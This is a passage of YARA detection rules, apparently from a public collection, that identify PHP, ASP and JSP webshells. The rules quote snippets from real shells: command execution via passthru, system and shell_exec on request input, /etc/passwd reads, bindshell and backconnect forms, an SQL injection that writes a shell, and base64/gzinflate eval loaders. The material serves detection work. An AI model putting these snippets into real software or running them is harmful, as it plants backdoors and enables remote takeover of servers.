    meta:
        id = "Cn2QBPke1LhxEnSMMLg6e"
        fingerprint = "v1_sha256_4b2eeb80200cc5dffa80cddc74f1902c0e8a5d2313d9a20d02eeb99ccb668ec0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file pws.php"
        category = "INFO"
        hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"

    strings:
        $s6 = "if ($_POST['cmd']){" fullword
        $s7 = "$cmd = $_POST['cmd'];" fullword
        $s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
        $s11 = "if (file_exists($uploaded)) {" fullword
        $s12 = "copy($uploaded, $dez);" fullword
        $s17 = "passthru($cmd);" fullword
    condition:
        4 of them
}
rule WebShell_reader_asp_php {
    meta:
        id = "62BkGDf3IT1yV2iRyFadVb"
        fingerprint = "v1_sha256_6ffda38584b6cdec818af8e09c62bb4a46f40230ffd5c1a68993a91c37f67680"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file reader.asp.php.txt"
        category = "INFO"
        hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"

    strings:
        $s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
        $s12 = " HACKING " fullword
        $s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
        $s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"
    condition:
        3 of them
}
rule WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2 {
    meta:
        id = "pGsPbjvQpJcqE3WgzoFBw"
        fingerprint = "v1_sha256_6840af0d9f99277277edce93deb54e9a319c8938169701c89fdeb65207590951"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
        category = "INFO"
        hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"

    strings:
        $s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
        $s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
        $s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
        $s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
        $s15 = "if(empty($_GET['file'])){" fullword
        $s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword
    condition:
        3 of them
}
rule WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
    meta:
        id = "4VBW0K0AGL4CfqyS946xY9"
        fingerprint = "v1_sha256_92bfac3516a448bbb3e78cf8950c6e816bf35d0ae2f3d32bc9b9b2836309999b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
        category = "INFO"
        hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"

    strings:
        $s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
        $s6 = "$liz0=shell_exec($_POST[baba]); " fullword
        $s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
        $s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
        $s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
    condition:
        1 of them
}
rule WebShell_php_backdoor {
    meta:
        id = "76fmiMKfWT22raSmvkuvqC"
        fingerprint = "v1_sha256_4228bcbfff5d7756615347196270f7916843e2aceacc7298610070b8b923381b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file php-backdoor.php"
        category = "INFO"
        hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"

    strings:
        $s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
        $s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
        $s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
        $s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
        $s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
    condition:
        1 of them
}
rule WebShell_Worse_Linux_Shell {
    meta:
        id = "4gWUMqUX4UHTOHxam3JuPb"
        fingerprint = "v1_sha256_6480c524213583511253ea1d37820994bba8a86f58a3775d4a9e4325725289d8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
        category = "INFO"
        hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"

    strings:
        $s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
        $s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
        $s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
        $s8 = "$currentCMD = \"ls -la\";" fullword
        $s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
        $s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword
    condition:
        2 of them
}
rule WebShell_php_webshells_pHpINJ {
    meta:
        id = "6iNiV6EHUZMDgHZQaG5SFf"
        fingerprint = "v1_sha256_271efaa8f370376f971d3d59256658b341599ac554cc216e09401e44b16bdede"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file pHpINJ.php"
        category = "INFO"
        hash = "75116bee1ab122861b155cc1ce45a112c28b9596"

    strings:
        $s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
        $s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
        $s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
        $s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
        $s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
        $s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
        $s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
    condition:
        1 of them
}
rule WebShell_php_webshells_NGH {
    meta:
        id = "4nO8mGmBS1qss26GfkKISd"
        fingerprint = "v1_sha256_572b026545b012951136bdb9b1101e38f27bc3321b895799bc853ea1190877f9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file NGH.php"
        category = "INFO"
        hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"

    strings:
        $s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
        $s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
        $s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
        $s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
        $s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
        $s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
        $s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword
    condition:
        2 of them
}
rule WebShell_php_webshells_matamu {
    meta:
        id = "3lued9dUqRpaJlnxN6VL7X"
        fingerprint = "v1_sha256_c0101dab5fe7c3a2652b2e23e1ef0274364137895a402a0367c6b5474c0e8a1f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file matamu.php"
        category = "INFO"
        hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"

    strings:
        $s2 = "$command .= ' -F';" fullword
        $s3 = "/* We try and match a cd command. */" fullword
        $s4 = "directory... Trust me - it works :-) */" fullword
        $s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
        $s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
        $s16 = "/* The last / in work_dir were the first charecter." fullword
    condition:
        2 of them
}
rule WebShell_ru24_post_sh {
    meta:
        id = "1zZ5bh3WGmRUm5y14AbfaC"
        fingerprint = "v1_sha256_6cf15a67c311979d32edfb443701cef34ee32d7a672314fc7b60b262b6b2c402"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file ru24_post_sh.php"
        category = "INFO"
        hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"

    strings:
        $s1 = "http://www.ru24-team.net" fullword
        $s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
        $s6 = "Ru24PostWebShell"
        $s7 = "Writed by DreAmeRz" fullword
        $s9 = "$function=passthru; // system, exec, cmd" fullword
    condition:
        1 of them
}
rule WebShell_hiddens_shell_v1 {
    meta:
        id = "7OpUNeRO6tKT08h93atjW2"
        fingerprint = "v1_sha256_b76400c320e6294b0c831fbbb8e08a9d2097fbb027065f9c4b496d4b005ba016"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file hiddens shell v1.php"
        category = "INFO"
        hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"

    strings:
        $s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
    condition:
        all of them
}
rule WebShell_c99_madnet {
    meta:
        id = "WhUIBmztBZ0dIWSIbxDCJ"
        fingerprint = "v1_sha256_cd4048f28405f106302643656ae5f8a257aaec0184a8057a9dffbda9bb857027"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file c99_madnet.php"
        category = "INFO"
        hash = "17613df393d0a99fd5bea18b2d4707f566cff219"

    strings:
        $s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
        $s1 = "eval(gzinflate(base64_decode('"
        $s2 = "$pass = \"pass\";  //Pass" fullword
        $s3 = "$login = \"user\"; //Login" fullword
        $s4 = "             //Authentication" fullword
    condition:
        all of them
}
rule WebShell_c99_locus7s {
    meta:
        id = "5H4ET8BEpdm4zJC7WMAoNP"
        fingerprint = "v1_sha256_5ecfc5f6da471bd3037228c0bc762d50762933af3cf6674210c7b2017a45a646"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file c99_locus7s.php"
        category = "INFO"
        hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"

    strings:
        $s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
        $s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
        $s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
        $s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
        $s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
    condition:
        2 of them
}
rule WebShell_JspWebshell_1_2 {
    meta:
        id = "7QKzFvjRgQTE0FiQdCtiVH"
        fingerprint = "v1_sha256_13e696c1c671d7fda832c84f150e3f41ed55bf888c4bebfeb06ea68d6be65527"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
        category = "INFO"
        hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"

    strings:
        $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
        $s1 = "String password=request.getParameter(\"password\");" fullword
        $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
        $s7 = "String editfile=request.getParameter(\"editfile\");" fullword
        $s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
        $s12 = "password = (String)session.getAttribute(\"password\");" fullword
    condition:
        3 of them
}
rule WebShell_safe0ver {
    meta:
        id = "4BikpFpxc3OL0OiBC8eirL"
        fingerprint = "v1_sha256_ae5de63b79804cf8c99bc5ea0c8862cf05e4085451d2b516cf95565bf32f3876"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file safe0ver.php"
        category = "INFO"
        hash = "366639526d92bd38ff7218b8539ac0f154190eb8"

    strings:
        $s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
        $s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
        $s5 = "else { /* <!-- Then it must be a File... --> */" fullword
        $s7 = "$contents .= htmlentities( $line ) ;" fullword
        $s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
        $s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
        $s20 = "/* <!-- End of Actions --> */" fullword
    condition:
        3 of them
}
rule WebShell_Uploader {
    meta:
        id = "7hi1gNnmRPf72PufzlFzzi"
        fingerprint = "v1_sha256_c4b915f60a952131caa2c4f5bb2eea85ef25f27cabb8ad36a6bb928433558954"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Uploader.php"
        category = "INFO"
        hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"

    strings:
        $s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
    condition:
        all of them
}
rule WebShell_php_webshells_kral {
    meta:
        id = "5e3xFiQG1SpoDxxZHr5ZZD"
        fingerprint = "v1_sha256_0aded226f4e54c0169b9fbda91458f581ea47f9f8bda61a350b5e6f8b60931f3"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file kral.php"
        category = "INFO"
        hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"

    strings:
        $s1 = "$adres=gethostbyname($ip);" fullword
        $s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
        $s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
        $s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
        $s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
        $s20 = "<p><strong>Server listeleyici</strong><br />" fullword
    condition:
        2 of them
}
rule WebShell_cgitelnet {
    meta:
        id = "1PXtT0RBndqAfPO885gvm2"
        fingerprint = "v1_sha256_e9b7096d5a19c9d5423bbfe125ae0347853919ab092efa98f0687a5d0cf68953"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file cgitelnet.php"
        category = "INFO"
        hash = "72e5f0e4cd438e47b6454de297267770a36cbeb3"

    strings:
        $s9 = "# Author Homepage: http://www.rohitab.com/" fullword
        $s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
        $s18 = "# in a command line on Windows NT." fullword
        $s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
    condition:
        2 of them
}
rule WebShell_simple_backdoor {
    meta:
        id = "2bUTFzDh3zVYkq9Tl0B53t"
        fingerprint = "v1_sha256_655e445e51ec0f1bdce006a72acf3bce95941a349c279c14768760fa9f6f9d76"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file simple-backdoor.php"
        category = "INFO"
        hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"

    strings:
        $s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
        $s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
        $s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
        $s3 = "        echo \"</pre>\";" fullword
        $s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
        $s5 = "        echo \"<pre>\";" fullword
        $s6 = "if(isset($_REQUEST['cmd'])){" fullword
        $s7 = "        die;" fullword
        $s8 = "        system($cmd);" fullword
    condition:
        all of them
}
rule WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_2 {
    meta:
        id = "N7zgWn30zsz364pXuE01t"
        fingerprint = "v1_sha256_fbe1f77e00fbc4e58cbad564e2d96c0381765ac799dfdf6cc2580428c68f97a5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
        category = "INFO"
        hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"

    strings:
        $s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
        $s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
        $s4 = "$v = @ini_get(\"open_basedir\");" fullword
        $s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
    condition:
        2 of them
}
rule WebShell_NTDaddy_v1_9 {
    meta:
        id = "1wEUTtg5d6mDGwkXxsZ3ZA"
        fingerprint = "v1_sha256_fdf8b4bb4980e588ad5ccee2d047660980d39f38617f887c5762dcdb0b858267"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
        category = "INFO"
        hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"

    strings:
        $s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
        $s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
        $s13 = "<form action=ntdaddy.asp method=post>" fullword
        $s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword
    condition:
        2 of them
}
rule WebShell_lamashell {
    meta:
        id = "4ovDrxPXQ8swNzKoJvN7xd"
        fingerprint = "v1_sha256_59821f4899c231314f51a49e60849ada6efb1e070fdb4da79ef7ff534869c46c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file lamashell.php"
        category = "INFO"
        hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"

    strings:
        $s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
        $s8 = "$curcmd = $_POST['king'];" fullword
        $s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
        $s18 = "<title>lama's'hell v. 3.0</title>" fullword
        $s19 = "_|_  O    _    O  _|_" fullword
        $s20 = "$curcmd = \"ls -lah\";" fullword
    condition:
        2 of them
}
rule WebShell_Simple_PHP_backdoor_by_DK {
    meta:
        id = "1DR1Xe1ir37xxmMldknAn0"
        fingerprint = "v1_sha256_1f65f759ec4045c521085aad84d0aea4dcfcf26eac4357751cf1dde6886d1718"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
        category = "INFO"
        hash = "03f6215548ed370bec0332199be7c4f68105274e"

    strings:
        $s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
        $s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
        $s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
        $s6 = "if(isset($_REQUEST['cmd'])){" fullword
        $s8 = "system($cmd);" fullword
    condition:
        2 of them
}
rule WebShell_Moroccan_Spamers_Ma_EditioN_By_GhOsT {
    meta:
        id = "6HZ6ENK1Lm804AomFcVDIQ"
        fingerprint = "v1_sha256_0e3d2d97665b8849d121d63a22baf7393047a814dde3753e395418c1868b59be"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
        category = "INFO"
        hash = "31e5473920a2cc445d246bc5820037d8fe383201"

    strings:
        $s4 = "$content = chunk_split(base64_encode($content)); " fullword
        $s12 = "print \"Sending mail to $to....... \"; " fullword
        $s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword
    condition:
        all of them
}
rule WebShell_C99madShell_v__2_0_madnet_edition {
    meta:
        id = "1Mu9tLiNE1WIlnJVsvRYbk"
        fingerprint = "v1_sha256_7cf825a604783ebc74b1dca53aaff5c886957c562e11276f2acce5ff1f6ab991"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
        category = "INFO"
        hash = "f99f8228eb12746847f54bad45084f19d1a7e111"

    strings:
        $s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
        $s1 = "eval(gzinflate(base64_decode('"
        $s2 = "$pass = \"\";  //Pass" fullword
        $s3 = "$login = \"\"; //Login" fullword
        $s4 = "//Authentication" fullword
    condition:
        all of them
}
rule WebShell_CmdAsp_asp_php {
    meta:
        id = "7JQ8j3lyZzjyGUXHtFgX9R"
        fingerprint = "v1_sha256_0fd9c7e83ad9ddf5cf88f1d1573324d9f24ae03a1951446fe11c116fd0cf4932"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
        category = "INFO"
        hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"

    strings:
        $s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
        $s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
        $s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
        $s6 = "' --------------------o0o--------------------" fullword
        $s8 = "' File: CmdAsp.asp" fullword
        $s11 = "<-- CmdAsp.asp -->" fullword
        $s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
        $s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
        $s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
    condition:
        4 of them
}
rule WebShell_NCC_Shell {
    meta:
        id = "5J1EcrHkLJh8yjNEqWA6l2"
        fingerprint = "v1_sha256_c58edc548b7804be25f6956e9407cc9f8c74dfd8651f601a87ba639284e612d9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file NCC-Shell.php"
        category = "INFO"
        hash = "64d4495875a809b2730bd93bec2e33902ea80a53"

    strings:
        $s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
        $s1 = "<b>--Coded by Silver" fullword
        $s2 = "<title>Upload - Shell/Datei</title>" fullword
        $s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
        $s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
        $s18 = "printf(\"Sie ist %u Bytes gro" fullword
    condition:
        3 of them
}
rule WebShell_php_webshells_README {
    meta:
        id = "3CVfEFjPNPE2A2Q0hthyF"
        fingerprint = "v1_sha256_aa8a9be74bbac08518d5ba442aa6fa37d3f1b255df48b49ccb9842f5728a49d5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file README.md"
        category = "INFO"
        hash = "ef2c567b4782c994db48de0168deb29c812f7204"

    strings:
        $s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
        $s1 = "php-webshells" fullword
    condition:
        all of them
}
rule WebShell_backupsql {
    meta:
        id = "3JQE4XVsYvBclrTkC5tKs5"
        fingerprint = "v1_sha256_0126bfad6eb3861e8322ac3e11b4fd95bc8b88597d916e66c6646d7d5529c1d5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file backupsql.php"
        category = "INFO"
        hash = "863e017545ec8e16a0df5f420f2d708631020dd4"

    strings:
        $s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
        $s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
        $s2 = "* as email attachment, or send to a remote ftp server by" fullword
        $s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
        $s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "
    condition:
        2 of them
}
rule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version {
    meta:
        id = "7c3sqHhbn7V9Qb9NDdPMXC"
        fingerprint = "v1_sha256_4fbf8f5cab8593fd88e5a430b849e61d7d663c13700f459aa516c5b337d5438b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
        category = "INFO"
        hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"

    strings:
        $s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
        $s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
        $s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
    condition:
        1 of them
}
rule WebShell_php_webshells_cpanel {
    meta:
        id = "XC2f9EOPp5tfGeAn3QKdq"
        fingerprint = "v1_sha256_e4dc90c52648f1e5b7dc2d77dcb94feb774ec9e3c156c923c54a9e8f537bbf07"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file cpanel.php"
        category = "INFO"
        hash = "433dab17106b175c7cf73f4f094e835d453c0874"

    strings:
        $s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
        $s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
        $s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
        $s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
        $s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
        $s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword
    condition:
        2 of them
}
rule WebShell_accept_language {
    meta:
        id = "54srnEA3MVBMnQ5UOFO6Zd"
        fingerprint = "v1_sha256_6d45071722268f5b39b1486a7dce883ecefb2b3c9993357b7b58bd603ff1c40d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file accept_language.php"
        category = "INFO"
        hash = "180b13576f8a5407ab3325671b63750adbcb62c9"

    strings:
        $s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
    condition:
        all of them
}
rule WebShell_php_webshells_529 {
    meta:
        id = "5WnPw3VbffmNvLm89xphWb"
